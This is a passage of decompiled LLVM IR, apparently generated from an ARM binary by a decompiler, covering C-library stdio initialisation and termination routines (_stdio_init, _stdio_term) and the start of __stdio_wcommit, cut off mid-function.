  %v0_172ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_172f0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_172ec = inttoptr i32 %v0_172ec.pre to i32*
  %v2_172ec = load i32, i32* %v1_172ec, align 4
  store i32 %v2_172ec, i32* %r3.global-to-local, align 4
  %v3_172f0 = icmp uge i32 %v2_172ec, %v1_172f0.pre
  store i1 %v3_172f0, i1* %cpsr_c.global-to-local, align 1
  %v9_172f0 = icmp eq i32 %v2_172ec, %v1_172f0.pre
  br i1 %v9_172f0, label %dec_label_pc_172f8, label %dec_label_pc_17310

dec_label_pc_1730c:                               ; preds = %dec_label_pc_172f8
  %v0_1730c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1730c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17310

dec_label_pc_17310:                               ; preds = %dec_label_pc_172e0, %dec_label_pc_172f8.dec_label_pc_172ec_crit_edge, %dec_label_pc_1730c
  %v0_17318 = phi i32 [ %v0_1730c, %dec_label_pc_1730c ], [ %v2_172ec71, %dec_label_pc_172e0 ], [ %v2_172ec, %dec_label_pc_172f8.dec_label_pc_172ec_crit_edge ]
  %v1_17310 = phi i32 [ %v0_1730c, %dec_label_pc_1730c ], [ %v2_172e0, %dec_label_pc_172e0 ], [ %v1_172f0.pre, %dec_label_pc_172f8.dec_label_pc_172ec_crit_edge ]
  %v3_17310 = icmp uge i32 %v0_17318, %v1_17310
  store i1 %v3_17310, i1* %cpsr_c.global-to-local, align 1
  %v9_17310 = icmp eq i32 %v0_17318, %v1_17310
  br i1 %v9_17310, label %dec_label_pc_17318, label %dec_label_pc_17310.dec_label_pc_172e0_crit_edge

dec_label_pc_17310.dec_label_pc_172e0_crit_edge:  ; preds = %dec_label_pc_17310
  %v0_172e0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_172e0

dec_label_pc_17318:                               ; preds = %dec_label_pc_17310
  %v2_17318 = icmp ne i32 %v1_17310, 0
  store i1 %v2_17318, i1* %cpsr_c.global-to-local, align 1
  %v7_1731c = icmp slt i32 %v1_17310, 2
  br i1 %v7_1731c, label %dec_label_pc_17340, label %dec_label_pc_17320

dec_label_pc_17320:                               ; preds = %dec_label_pc_17318
  %v0_17320 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17320, i32* %r0.global-to-local, align 4
  %v0_17324 = load i32, i32* @r1, align 4
  %v1_17324 = add i32 %v0_17324, 129
  store i32 %v1_17324, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17340

dec_label_pc_1733c:                               ; preds = %dec_label_pc_16f80, %dec_label_pc_16f64, %dec_label_pc_16f8c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_17340

dec_label_pc_17340:                               ; preds = %dec_label_pc_172bc, %dec_label_pc_17318, %bb57, %dec_label_pc_16fc4, %dec_label_pc_17320, %dec_label_pc_1733c
  %v0_17340 = load i32, i32* @r5, align 4
  store i32 %v0_17340, i32* %r0.global-to-local, align 4
  %v2_17348 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17348, i32* %r4.global-to-local, align 4
  store i32 %v6_16f24, i32* @r5, align 4
  store i32 %v9_16f24, i32* @r6, align 4
  store i32 %v12_16f24, i32* @r7, align 4
  store i32 %v15_16f24, i32* @r8, align 4
  ret i32 %v0_17340

; uselistorder directives
  uselistorder i32 %v0_1730c, { 1, 0, 2 }
  uselistorder i32 %v1_172f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_172e0, { 1, 0 }
  uselistorder i32 %v0_17290, { 1, 0, 2 }
  uselistorder i32 %v1_17274.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17264, { 1, 0 }
  uselistorder i32 %v0_1720c, { 1, 0, 2 }
  uselistorder i32 %v1_171f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_171a4, { 1, 0, 2 }
  uselistorder i32 %v1_17188, { 0, 2, 1 }
  uselistorder i32 %v4_17164, { 2, 1, 0, 3 }
  uselistorder i32 %v1_17114.pre, { 2, 1, 0 }
  uselistorder i32 %v0_17098, { 1, 2, 0 }
  uselistorder i32 %v1_17028, { 1, 0 }
  uselistorder i32 %v0_17028, { 1, 0 }
  uselistorder i32 %v1_17010, { 1, 2, 0, 3 }
  uselistorder i32 %v1_16fb4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 51, 5, 6, 7, 8, 9, 11, 10, 52, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 32, 33, 3, 4, 5, 6, 34, 35, 7, 8, 9, 36, 37, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 16384, { 69, 70, 0, 1, 71, 32, 62, 33, 63, 34, 64, 35, 65, 36, 66, 37, 67, 15, 68, 2, 46, 28, 50, 29, 51, 27, 47, 30, 48, 31, 49, 3, 52, 4, 53, 5, 54, 6, 55, 7, 56, 8, 57, 9, 58, 10, 59, 11, 60, 12, 61, 38, 72, 13, 73, 14, 74, 17, 75, 40, 76, 41, 77, 42, 78, 16, 79, 39, 80, 81, 18, 82, 19, 83, 20, 84, 43, 85, 21, 86, 22, 87, 24, 88, 23, 89, 25, 90, 26, 91, 45, 92, 93, 94, 44, 95 }
  uselistorder i32 (i32, i32)* @__libc_open, { 6, 0, 2, 1, 5, 4, 3 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 14, 0, 13, 10, 9, 12, 11, 6, 5, 4, 3, 8, 7, 2, 1 }
  uselistorder i32 1024, { 2, 3, 4, 0, 5, 6, 7, 8, 1, 9 }
  uselistorder i32 ()* @malloc, { 72, 71, 70, 4, 1, 0, 2, 3, 6, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 ()* @free, { 10, 9, 5, 2, 1, 0, 3, 8, 7, 6, 4 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_17340, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1733c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17310, { 2, 1, 0 }
  uselistorder label %dec_label_pc_172f8, { 1, 0 }
  uselistorder label %dec_label_pc_172bc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17294, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1727c, { 1, 0 }
  uselistorder label %dec_label_pc_17220, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_17210, { 2, 1, 0 }
  uselistorder label %dec_label_pc_171f8, { 1, 0 }
  uselistorder label %dec_label_pc_171b8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_171a8, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_170f0, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_17058._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17000, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16f9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16f64, { 1, 2, 0 }
}

define i32 @function_17354(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17354:
  %v0_17354 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17354, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17354
  %v5_17354 = sdiv i32 %arg2, 16
  %v6_17354 = and i32 %v5_17354, %arg1
  %v5_17358 = sdiv i32 %arg2, 256
  %v6_17358 = and i32 %v6_17354, %v5_17358
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17354, %bb
  %v10_1735c = phi i32 [ %arg1, %dec_label_pc_17354 ], [ %v6_17358, %bb ]
  ret i32 %v10_1735c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_1738c = call i32 @__aeabi_read_tp()
  %v3_17390 = load i16, i16* @global_var_233d0.483, align 2
  %v4_17390 = sext i16 %v3_17390 to i32
  store i32 %v4_17390, i32* @r3, align 4
  store i32 %v0_1738c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_1739c = add i32 %v4_17390, %v0_1738c
  %v3_1739c = inttoptr i32 %v2_1739c to i32*
  %v4_1739c = load i32, i32* %v3_1739c, align 4
  store i32 %v4_1739c, i32* @r6, align 4
  %v1_173a0 = call i32 @isatty(i32 0)
  %v2_173a8 = icmp eq i32 %v1_173a0, 0
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r4, align 4
  br i1 %v2_173a8, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_173b4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 308) to i16*), align 4
  %v7_173b4 = zext i16 %v5_173b4 to i32
  %v2_173b8 = xor i32 %v7_173b4, 256
  store i32 %v2_173b8, i32* @r3, align 4
  %v2_173bc = trunc i32 %v2_173b8 to i16
  store i16 %v2_173bc, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_173c4 = call i32 @isatty(i32 1)
  %v2_173c8 = icmp eq i32 %v1_173c4, 0
  br i1 %v2_173c8, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_173d0 = load i32, i32* @r4, align 4
  %v2_173d4 = add i32 %v1_173d0, 376
  %v3_173d4 = inttoptr i32 %v2_173d4 to i16*
  %v4_173d4 = load i16, i16* %v3_173d4, align 2
  %v2_173d8 = xor i16 %v4_173d4, 256
  store i16 %v2_173d8, i16* %v3_173d4, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_173e4 = load i16, i16* @global_var_233d0.483, align 2
  %v4_173e4 = sext i16 %v3_173e4 to i32
  %v0_173e8 = load i32, i32* @r6, align 4
  %v1_173e8 = load i32, i32* @r5, align 4
  %v3_173e8 = add i32 %v1_173e8, %v4_173e4
  %v4_173e8 = inttoptr i32 %v3_173e8 to i32*
  store i32 %v0_173e8, i32* %v4_173e8, align 4
  ret i32 %v1_173c4

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17404 = load i32, i32* @r4, align 4
  store i32 %v3_17404, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_17418 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_17418, i32* %r0.global-to-local, align 4
  %v5_17418 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_17418, i32* %r1.global-to-local, align 4
  %v8_17418 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 -33092) to i32*), align 4
  %v2_17420 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_17420, i32* %r3.global-to-local, align 4
  store i32 %v2_17418, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_1742c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 152) to i32*), align 4
  store i32 %v2_17418, i32* %r0.global-to-local, align 4
  store i32 %v5_17418, i32* %r1.global-to-local, align 4
  store i32 %v8_17418, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_1743c = inttoptr i32 %v4_1742c to i32*
  store i32 %v2_17418, i32* %v1_1743c, align 4
  %v3_1743c = add i32 %v4_1742c, 4
  %v4_1743c = inttoptr i32 %v3_1743c to i32*
  %v5_1743c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1743c, i32* %v4_1743c, align 4
  %v6_1743c = add i32 %v4_1742c, 8
  %v7_1743c = inttoptr i32 %v6_1743c to i32*
  %v8_1743c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1743c, i32* %v7_1743c, align 4
  %v0_17440 = load i32, i32* %r3.global-to-local, align 4
  %v1_17440 = inttoptr i32 %v0_17440 to i32*
  %v2_17440 = load i32, i32* %v1_17440, align 4
  store i32 %v2_17440, i32* %r0.global-to-local, align 4
  %v3_17440 = add i32 %v0_17440, 4
  %v4_17440 = inttoptr i32 %v3_17440 to i32*
  %v5_17440 = load i32, i32* %v4_17440, align 4
  store i32 %v5_17440, i32* %r1.global-to-local, align 4
  %v6_17440 = add i32 %v0_17440, 8
  %v7_17440 = inttoptr i32 %v6_17440 to i32*
  %v8_17440 = load i32, i32* %v7_17440, align 4
  %v2_17444 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_17444, i32* %r3.global-to-local, align 4
  store i32 %v2_17440, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_17450 = load i32, i32* %r7.global-to-local, align 4
  %v2_17450 = add i32 %v0_17450, 76
  %v3_17450 = inttoptr i32 %v2_17450 to i32*
  %v4_17450 = load i32, i32* %v3_17450, align 4
  store i32 %v4_17450, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_17458 = inttoptr i32 %v4_17450 to i32*
  %v2_17458 = load i32, i32* %v1_17458, align 4
  store i32 %v2_17458, i32* %r5.global-to-local, align 4
  %v2_1745c = add i32 %v0_17450, 160
  %v3_1745c = inttoptr i32 %v2_1745c to i32*
  %v4_1745c = load i32, i32* %v3_1745c, align 4
  store i32 %v2_17440, i32* %r0.global-to-local, align 4
  store i32 %v5_17440, i32* %r1.global-to-local, align 4
  store i32 %v8_17440, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_1746c = add i32 %v0_17450, -33124
  store i32 %v2_1746c, i32* %sl.global-to-local, align 4
  %v1_17470 = inttoptr i32 %v4_1745c to i32*
  store i32 %v2_17440, i32* %v1_17470, align 4
  %v3_17470 = add i32 %v4_1745c, 4
  %v4_17470 = inttoptr i32 %v3_17470 to i32*
  %v5_17470 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17470, i32* %v4_17470, align 4
  %v6_17470 = add i32 %v4_1745c, 8
  %v7_17470 = inttoptr i32 %v6_17470 to i32*
  %v8_17470 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17470, i32* %v7_17470, align 4
  %v0_17500.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1750016 = icmp eq i32 %v0_17500.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1750818 = add i32 %v0_17500.pr, 56
  store i32 %v1_1750818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1750016, label %dec_label_pc_17514, label %dec_label_pc_17478

dec_label_pc_17478:                               ; preds = %entry, %.thread10
  %v0_17478 = phi i32 [ %v3_174fc, %.thread10 ], [ %v0_17500.pr, %entry ]
  %v1_17478 = add i32 %v0_17478, 64
  %v2_17478 = inttoptr i32 %v1_17478 to i32*
  %v3_17478 = load i32, i32* %v2_17478, align 4
  store i32 %v3_17478, i32* %r3.global-to-local, align 4
  %v0_1747c = call i32 @__aeabi_read_tp()
  store i32 %v0_1747c, i32* %r0.global-to-local, align 4
  %v1_17480 = add i32 %v0_1747c, -1168
  store i32 %v1_17480, i32* %r6.global-to-local, align 4
  %v3_17484 = icmp uge i32 %v3_17478, %v1_17480
  store i1 %v3_17484, i1* %cpsr_c.global-to-local, align 1
  %v9_17484 = icmp eq i32 %v3_17478, %v1_17480
  br i1 %v9_17484, label %.thread1, label %dec_label_pc_17498

.thread1:                                         ; preds = %dec_label_pc_17478
  %v1_17488 = load i32, i32* %r5.global-to-local, align 4
  %v2_17488 = add i32 %v1_17488, 60
  %v3_17488 = inttoptr i32 %v2_17488 to i32*
  %v4_17488 = load i32, i32* %v3_17488, align 4
  %v2_1748c = add i32 %v4_17488, 1
  store i32 %v2_1748c, i32* %r3.global-to-local, align 4
  store i32 %v2_1748c, i32* %v3_17488, align 4
  br label %.thread10

dec_label_pc_17498:                               ; preds = %dec_label_pc_17478, %dec_label_pc_174a4
  %v0_17498 = load i32, i32* %r2.global-to-local, align 4
  %v1_17498 = inttoptr i32 %v0_17498 to i32*
  %v2_17498 = load i32, i32* %v1_17498, align 4
  store i32 %v2_17498, i32* %r3.global-to-local, align 4
  %v1_1749c = load i32, i32* %r4.global-to-local, align 4
  %v3_1749c = icmp uge i32 %v2_17498, %v1_1749c
  store i1 %v3_1749c, i1* %cpsr_c.global-to-local, align 1
  %v9_1749c = icmp eq i32 %v2_17498, %v1_1749c
  br i1 %v9_1749c, label %dec_label_pc_174a4, label %dec_label_pc_174bc

dec_label_pc_174a4:                               ; preds = %dec_label_pc_17498
  store i32 %v2_17498, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_174b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_174b4, label %dec_label_pc_174b8, label %dec_label_pc_17498

dec_label_pc_174b8:                               ; preds = %dec_label_pc_174a4
  %v0_174b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_174b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_174bc

dec_label_pc_174bc:                               ; preds = %dec_label_pc_17498, %dec_label_pc_174b8
  %v0_174bc = phi i32 [ %v0_174b8, %dec_label_pc_174b8 ], [ %v2_17498, %dec_label_pc_17498 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_174bc = icmp eq i32 %v0_174bc, 0
  %v2_174c8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_174bc, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_174bc
  %v1_174c8 = load i32, i32* %r6.global-to-local, align 4
  %v3_174c8 = add i32 %v2_174c8.pre, 64
  %v4_174c8 = inttoptr i32 %v3_174c8 to i32*
  store i32 %v1_174c8, i32* %v4_174c8, align 4
  %v1_174cc = load i32, i32* %r1.global-to-local, align 4
  %v2_174cc = load i32, i32* %r5.global-to-local, align 4
  %v3_174cc = add i32 %v2_174cc, 60
  %v4_174cc = inttoptr i32 %v3_174cc to i32*
  store i32 %v1_174cc, i32* %v4_174cc, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_174bc
  %v2_174c0 = add i32 %v2_174c8.pre, 8
  %v3_174c0 = inttoptr i32 %v2_174c0 to i32*
  %v4_174c0 = load i32, i32* %v3_174c0, align 4
  store i32 %v4_174c0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_174d0 = add i32 %v2_174c8.pre, 20
  %v4_174d0 = inttoptr i32 %v3_174d0 to i32*
  store i32 %v4_174c0, i32* %v4_174d0, align 4
  %v1_174d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_174d4 = trunc i32 %v1_174d4 to i16
  %v3_174d4 = load i32, i32* %r5.global-to-local, align 4
  %v4_174d4 = inttoptr i32 %v3_174d4 to i16*
  store i16 %v2_174d4, i16* %v4_174d4, align 2
  %v1_174d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_174d8 = load i32, i32* %r5.global-to-local, align 4
  %v3_174d8 = add i32 %v2_174d8, 24
  %v4_174d8 = inttoptr i32 %v3_174d8 to i32*
  store i32 %v1_174d8, i32* %v4_174d8, align 4
  %v1_174dc = load i32, i32* %r3.global-to-local, align 4
  %v2_174dc = load i32, i32* %r5.global-to-local, align 4
  %v3_174dc = add i32 %v2_174dc, 28
  %v4_174dc = inttoptr i32 %v3_174dc to i32*
  store i32 %v1_174dc, i32* %v4_174dc, align 4
  %v1_174e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_174e0 = load i32, i32* %r5.global-to-local, align 4
  %v3_174e0 = add i32 %v2_174e0, 16
  %v4_174e0 = inttoptr i32 %v3_174e0 to i32*
  store i32 %v1_174e0, i32* %v4_174e0, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_174e4 = load i32, i32* %sl.global-to-local, align 4
  %v1_174e4 = inttoptr i32 %v0_174e4 to i32*
  %v2_174e4 = load i32, i32* %v1_174e4, align 4
  store i32 %v2_174e4, i32* %r0.global-to-local, align 4
  %v3_174e4 = add i32 %v0_174e4, 4
  %v4_174e4 = inttoptr i32 %v3_174e4 to i32*
  %v5_174e4 = load i32, i32* %v4_174e4, align 4
  store i32 %v5_174e4, i32* %r1.global-to-local, align 4
  %v6_174e4 = add i32 %v0_174e4, 8
  %v7_174e4 = inttoptr i32 %v6_174e4 to i32*
  %v8_174e4 = load i32, i32* %v7_174e4, align 4
  store i32 %v8_174e4, i32* %r2.global-to-local, align 4
  %v1_174ec = load i32, i32* %r5.global-to-local, align 4
  %v2_174ec = add i32 %v1_174ec, 52
  %v3_174ec = inttoptr i32 %v2_174ec to i32*
  store i32 1, i32* %v3_174ec, align 4
  %v0_174f0 = load i32, i32* %r5.global-to-local, align 4
  %v1_174f0 = add i32 %v0_174f0, 56
  store i32 %v1_174f0, i32* %r3.global-to-local, align 4
  %v2_174f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_174f8 = inttoptr i32 %v1_174f0 to i32*
  store i32 %v2_174f4, i32* %v1_174f8, align 4
  %v3_174f8 = add i32 %v0_174f0, 60
  %v4_174f8 = inttoptr i32 %v3_174f8 to i32*
  %v5_174f8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_174f8, i32* %v4_174f8, align 4
  %v6_174f8 = add i32 %v0_174f0, 64
  %v7_174f8 = inttoptr i32 %v6_174f8 to i32*
  %v8_174f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_174f8, i32* %v7_174f8, align 4
  %v0_174fc = load i32, i32* %r5.global-to-local, align 4
  %v1_174fc = add i32 %v0_174fc, 32
  %v2_174fc = inttoptr i32 %v1_174fc to i32*
  %v3_174fc = load i32, i32* %v2_174fc, align 4
  store i32 %v3_174fc, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17500 = icmp eq i32 %v3_174fc, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_17508 = add i32 %v3_174fc, 56
  store i32 %v1_17508, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_17500, label %dec_label_pc_17514, label %dec_label_pc_17478

dec_label_pc_17514:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_17518 = load i32, i32* %r7.global-to-local, align 4
  %v2_17518 = add i32 %v0_17518, 76
  %v3_17518 = inttoptr i32 %v2_17518 to i32*
  %v4_17518 = load i32, i32* %v3_17518, align 4
  store i32 %v4_17518, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_17518 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1753814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1753814, label %dec_label_pc_17540, label %dec_label_pc_17524

dec_label_pc_17524:                               ; preds = %dec_label_pc_17514, %dec_label_pc_17538
  %v1_1752c = phi i32 [ %storemerge, %dec_label_pc_17538 ], [ %storemerge12, %dec_label_pc_17514 ]
  %v1_17524 = inttoptr i32 %v1_1752c to i16*
  %v2_17524 = load i16, i16* %v1_17524, align 2
  %v3_17524 = zext i16 %v2_17524 to i32
  store i32 %v3_17524, i32* %r3.global-to-local, align 4
  %v1_17528 = and i32 %v3_17524, 64
  %v2_17528 = icmp eq i32 %v1_17528, 0
  br i1 %v2_17528, label %dec_label_pc_17538, label %bb39

bb39:                                             ; preds = %dec_label_pc_17524
  store i32 %v1_1752c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17538

dec_label_pc_17538:                               ; preds = %dec_label_pc_17524, %bb39
  %v1_17530 = xor i1 %v2_17528, true
  call void @__pseudo_cond_branch(i1 %v1_17530, i32 ptrtoint (i32* @global_var_17568.764 to i32))
  %v0_17534 = load i32, i32* %r4.global-to-local, align 4
  %v1_17534 = add i32 %v0_17534, 32
  %storemerge.in = inttoptr i32 %v1_17534 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17538 = icmp eq i32 %storemerge, 0
  br i1 %v2_17538, label %dec_label_pc_17540, label %dec_label_pc_17524

dec_label_pc_17540:                               ; preds = %dec_label_pc_17538, %dec_label_pc_17514
  %v2_17544 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_17544, i32* %r4.global-to-local, align 4
  %v1_17548 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17548

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_174fc, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1749c, { 1, 0 }
  uselistorder i32 %v4_1745c, { 2, 1, 0 }
  uselistorder i32 %v4_1742c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_17538, { 1, 0 }
  uselistorder label %dec_label_pc_17524, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_174bc, { 1, 0 }
  uselistorder label %dec_label_pc_17498, { 1, 0 }
  uselistorder label %dec_label_pc_17478, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17568 = load i32, i32* @r4, align 4
  store i32 %v3_17568, i32* %stack_var_-8, align 4
  %v1_1756c = add i32 %arg1, 8
  %v2_1756c = inttoptr i32 %v1_1756c to i32*
  %v3_1756c = load i32, i32* %v2_1756c, align 4
  store i32 %v3_1756c, i32* @r1, align 4
  %v1_17570 = add i32 %arg1, 16
  %v2_17570 = inttoptr i32 %v1_17570 to i32*
  %v3_17570 = load i32, i32* %v2_17570, align 4
  %v9_17574 = icmp eq i32 %v3_17570, %v3_1756c
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_17574, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1756c, i32* %v2_17570, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_17580 = xor i1 %v9_17574, true
  call void @__pseudo_cond_branch(i1 %v1_17580, i32 ptrtoint (i32* @global_var_18f58.765 to i32))
  %v0_17584 = load i32, i32* %r4.global-to-local, align 4
  %v1_17584 = add i32 %v0_17584, 8
